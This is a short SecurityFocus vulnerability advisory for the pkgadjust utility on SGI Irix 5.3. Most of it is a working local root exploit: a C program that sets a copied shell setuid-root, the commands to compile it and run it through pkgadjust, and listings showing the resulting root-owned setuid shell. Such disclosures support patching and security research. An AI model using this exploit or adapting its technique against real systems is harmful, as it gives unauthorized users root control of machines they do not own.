source: http://www.securityfocus.com/bid/419/info

A vulnerability exists in the pkgadjust utility shipped with Irix 5.3 from Silicon Graphics. This vulnerability can result in the compromise of the root account. 

% cat > getroot.c
int main() { setuid(0); chown("sh",0,0); chmod("sh",04755); return 0; }
% cc getroot.c -o getroot
% cp /bin/sh sh
% ls -la sh
-rwxr-xr-x 1 hhui user 140784 Jan 5 20:52 sh
% /usr/pkg/bin/pkgadjust -f -a getroot
scanning inst-database

updating pkginfo-files
........................................^C
% ls -la sh
-rwsr-xr-x 1 root sys 140784 Jan 5 20:52 sh